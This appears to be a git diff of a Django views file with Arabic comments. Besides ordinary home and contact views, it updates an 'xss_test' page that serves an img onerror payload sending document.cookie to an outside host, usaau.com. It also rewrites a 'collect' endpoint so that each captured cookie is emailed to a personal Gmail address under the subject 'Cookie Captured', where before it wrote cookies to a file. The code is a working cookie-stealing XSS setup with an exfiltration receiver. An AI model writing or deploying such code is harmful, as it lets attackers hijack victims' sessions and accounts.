@@ -1,9 +1,7 @@
 from django.shortcuts import render, get_object_or_404
-from .models import City
 from django.http import HttpResponse
-import os
 from django.core.mail import send_mail
-from .models import ContactMessage
+from .models import City, ContactMessage
 
 # الصفحة الرئيسية
 def home(request):
@@ -27,8 +25,10 @@ def contact(request):
         email = request.POST.get('email')
         message = request.POST.get('message')
 
+        # حفظ الرسالة في قاعدة البيانات
         ContactMessage.objects.create(name=name, email=email, message=message)
 
+        # إرسال الرسالة إلى بريدك
         send_mail(
             subject=f'New Contact Message from {name}',
             message=message,
@@ -41,30 +41,28 @@ def contact(request):
 
     return render(request, 'contact.html')
 
-# صفحة XSS
+# صفحة اختبار XSS
 def xss_test(request):
     return HttpResponse("""
         <html>
         <body>
         <h1>XSS Test</h1>
-        <img src="x" onerror="fetch('https://usaau.com/collect/?cookie='+document.cookie)">
+        <img src="x" onerror="fetch('https://usaau.com/collect/?c='+document.cookie)">
         </body>
         </html>
     """)
 
-# استقبال الكوكيز وتخزينها
+# استقبال الكوكيز وإرسالها على الإيميل
 def collect(request):
-    cookie = request.GET.get("cookie", "")
-    if cookie:
-        with open("cookies.txt", "a") as f:
-            f.write(cookie + "\n")
-    return HttpResponse("Cookie received")
+    cookie_value = request.GET.get('c', '')
 
-# عرض الكوكيز المخزنة
-def view_cookies(request):
-    if os.path.exists("cookies.txt"):
-        with open("cookies.txt", "r") as f:
-            content = f.read()
-    else:
-        content = "No cookies stored yet."
-    return HttpResponse(f"<pre>{content}</pre>")
+    if cookie_value:
+        send_mail(
+            subject="Cookie Captured",
+            message=f"New cookie captured: {cookie_value}",
+            from_email="oboulechfar1@gmail.com",
+            recipient_list=["oboulechfar1@gmail.com"],
+            fail_silently=False,
+        )
+
+    return HttpResponse("OK")
